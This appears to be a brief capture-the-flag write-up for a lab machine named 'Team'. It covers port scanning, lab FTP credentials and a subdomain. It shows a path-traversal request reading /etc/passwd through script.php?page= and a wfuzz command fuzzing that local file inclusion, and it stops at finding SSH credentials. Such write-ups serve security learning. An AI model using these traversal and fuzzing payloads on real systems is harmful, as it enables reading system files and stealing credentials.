# TEAM

Let's start by a simple WebMap Scan

Well it's have 3 open Port 21 - 22 - 80
 
 I added team.thm to the hosts and now a new website just spawned let s check it
 
 I also found this username :  root, dale, gyles, and ftpuser
 
 Here I found some creds 
 
 read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3

Then I found a subdomain dev.team.thm

and I found an issue : http://dev.team.thm/script.php?page=/../../../../../../etc/passwd

After that I fuzzed the LFI using the following Command
```
╰─ wfuzz --hc 400 --hl 1 -w LFI-Wordlist.txt http://dev.team.thm/script.php?page=FUZZ | tee LFI-Fuzz.txt
```
And I found some ssh creds
